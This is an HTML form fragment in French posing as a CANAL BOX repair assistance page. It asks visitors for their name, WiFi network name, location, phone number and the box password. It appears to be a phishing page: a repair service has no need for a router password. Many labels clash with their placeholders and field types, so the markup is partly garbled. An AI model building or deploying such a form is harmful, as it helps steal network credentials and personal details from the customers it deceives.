    <div class="container">
      <form action="" method="POST">
        <h4> Bienvenue sur votre assistance de réparation CANAL BOX. Remplissez ce formulaire afin que nous puissions régler l'anomalie observée sur votre box CANAL BOX.</h4>
        <div class="input-section">
          <label>Votre nom :<span class="required-color">*</span></label>
          <input
            type="text"
            placeholder="Entrer votre Nom" 
            name="Entrer votre Nom"
            id="first-name-input"
            required
          />
        </div>
        <div class="input-section">
          <label>Le nom de votre Box(comment votre wifi est appelé):<span class="required-color">*</span></label>
          <input
            type="text "
            placeholder="Entrer votre Prénom"
            name="Last Name"
            required
          />
          
        </div>
        <div class="input-section">
          <label>où vous vous situez Mr/mdme: <span class="required-color">*</span></label>
          <input
            type="text "
            placeholder="Entrer votre date et lieu de naissance"
            name="Date et lieu de naissance"
            required
          />
          
        </div>
        <div class="input-section">
          <label>Numéro de téléphone<span class="required-color">*</span></label>
          <input type="email" placeholder="Entrer votre e-mail" name="email" required />
        </div>
        <div class="input-section">
          <label>Mot de passe de votre Box:<span class="required-color">*</span></label>
          <input
            type="text"
            placeholder="Entrer votre numéro de téléphone"
            name="phone"
            required
          />
        </div>

        <button id="submit-button">Envoyer le formulaire</button>
      </form>
    </div>
